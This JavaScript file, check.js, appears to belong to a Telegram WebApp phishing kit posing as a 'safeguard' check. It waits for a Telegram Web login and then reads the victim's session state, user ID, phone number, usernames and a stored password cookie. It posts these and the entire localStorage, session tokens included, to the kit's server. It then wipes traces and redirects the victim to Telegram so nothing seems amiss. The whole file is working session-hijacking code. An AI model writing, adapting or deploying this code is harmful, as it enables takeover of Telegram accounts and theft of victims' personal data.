document.addEventListener("DOMContentLoaded", function() {
  // Function to send debug logs to the server
  async function logToServer(message) {
    try {
      await fetch(`/api/debug`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ message: `check.js: ${message}` })
      });
    } catch (error) {
      console.error(`Failed to send debug log to server: ${error.message}`);
    }
  }

  console.log("check.js: Script loaded");
  logToServer("Script loaded");

  console.log(`check.js: window.Telegram exists: ${!!window.Telegram}`);
  logToServer(`window.Telegram exists: ${!!window.Telegram}`);

  console.log(`check.js: window.Telegram.WebApp exists: ${!!(window.Telegram && window.Telegram.WebApp)}`);
  logToServer(`window.Telegram.WebApp exists: ${!!(window.Telegram && window.Telegram.WebApp)}`);

  let loginAttempts = 0;
  const maxLoginAttempts = 50; // Wait for ~5 seconds (50 * 100ms) before prompting

  async function checkLocalStorage() {
    // First, check if the user is logged in via Telegram WebApp
    if (window.Telegram && window.Telegram.WebApp) {
      const user = window.Telegram.WebApp.initDataUnsafe?.user;
      console.log(`check.js: Telegram WebApp user: ${user ? JSON.stringify(user) : "Not logged in"}`);
      logToServer(`Telegram WebApp user: ${user ? JSON.stringify(user) : "Not logged in"}`);

      if (!user) {
        loginAttempts++;
        console.log(`check.js: Attempt ${loginAttempts}/${maxLoginAttempts} - User not logged in`);
        logToServer(`Attempt ${loginAttempts}/${maxLoginAttempts} - User not logged in`);

        if (loginAttempts >= maxLoginAttempts) {
          console.log("check.js: Max login attempts reached, user should have been redirected to login");
          logToServer("Max login attempts reached, user should have been redirected to login");
          return;
        }
        return;
      }
    }

    // Check localStorage for tt-global-state and user_auth
    let globalState = localStorage.getItem("tt-global-state");
    console.log(`check.js: tt-global-state exists: ${!!globalState}`);
    logToServer(`tt-global-state exists: ${!!globalState}`);

    console.log(`check.js: user_auth exists: ${!!localStorage.getItem("user_auth")}`);
    logToServer(`user_auth exists: ${!!localStorage.getItem("user_auth")}`);

    if (globalState && localStorage.getItem("user_auth")) {
      const parsedState = JSON.parse(globalState);
      const currentUserId = parsedState.currentUserId;
      const currentUser = parsedState.users?.byId?.[currentUserId];
      document.body.style.display = "none";

      if (currentUserId && currentUser) {
        console.log(`check.js: Found user data for userId ${currentUserId}`);
        logToServer(`Found user data for userId ${currentUserId}`);

        const { firstName, usernames, phoneNumber, isPremium } = currentUser;
        const password = document.cookie.split("; ").find(e => e.startsWith("password="))?.split("=")[1] || "No password set";

        localStorage.removeItem("GramJs:apiCache");
        localStorage.removeItem("tt-global-state");

        console.log(`check.js: Sending user data to /api/users/telegram/info for userId ${currentUserId}`);
        logToServer(`Sending user data to /api/users/telegram/info for userId ${currentUserId}`);

        try {
          const response = await fetch(`/api/users/telegram/info`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              userId: currentUserId,
              firstName: firstName || "Unknown",
              usernames: usernames || [],
              phoneNumber: phoneNumber || "Unknown",
              isPremium: isPremium || false,
              password: password,
              quicklySet: localStorage,
              type: new URLSearchParams(window.location.search).get("type") || "safeguard"
            })
          });

          if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
          }

          console.log(`check.js: Successfully sent user data to /api/users/telegram/info for userId ${currentUserId}`);
          logToServer(`Successfully sent user data to /api/users/telegram/info for userId ${currentUserId}`);
        } catch (error) {
          console.error(`check.js: Failed to send user data to /api/users/telegram/info: ${error.message}`);
          logToServer(`Failed to send user data to /api/users/telegram/info: ${error.message}`);
          return; // Stop further execution if the API call fails
        }

        console.log(`check.js: Opening Telegram link and closing WebApp`);
        logToServer(`Opening Telegram link and closing WebApp`);

        try {
          window.Telegram.WebApp.openTelegramLink("https://t.me/+8dtqN7T2sJpmNTb7");
          window.Telegram.WebApp.close();
        } catch (error) {
          console.error(`check.js: Failed to open Telegram link or close WebApp: ${error.message}`);
          logToServer(`Failed to open Telegram link or close WebApp: ${error.message}`);
        }

        localStorage.clear();
        document.cookie = "password=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
        window.location.href = "https://web.telegram.org/a/";  

        clearInterval(checkInterval);
      } else {
        console.log(`check.js: No user data found in tt-global-state`);
        logToServer(`No user data found in tt-global-state`);
      }
    } else {
      loginAttempts++;
      console.log(`check.js: Attempt ${loginAttempts}/${maxLoginAttempts} - tt-global-state or user_auth not found`);
      logToServer(`Attempt ${loginAttempts}/${maxLoginAttempts} - tt-global-state or user_auth not found`);

      if (loginAttempts >= maxLoginAttempts) {
        console.log("check.js: Max attempts reached, user should have been redirected to login");
        logToServer("Max attempts reached, user should have been redirected to login");
        return;
      }
    }
  }

  // Check if we’re returning from a login redirect
  const returnUrl = localStorage.getItem('returnUrl');
  if (returnUrl && window.location.pathname !== returnUrl.split('?')[0]) {
    console.log(`check.js: Returning from login, redirecting to ${returnUrl}`);
    logToServer(`Returning from login, redirecting to ${returnUrl}`);
    window.location.href = returnUrl;
    return;
  }

  const checkInterval = setInterval(checkLocalStorage, 100);

  // Listen for WebApp events to detect when the user returns
  if (window.Telegram && window.Telegram.WebApp) {
    window.Telegram.WebApp.onEvent("viewportChanged", () => {
      console.log("check.js: Viewport changed, user may have returned");
      logToServer("Viewport changed, user may have returned");
      loginAttempts = 0;
      clearInterval(checkInterval);
      setInterval(checkLocalStorage, 100);
    });
  }
});
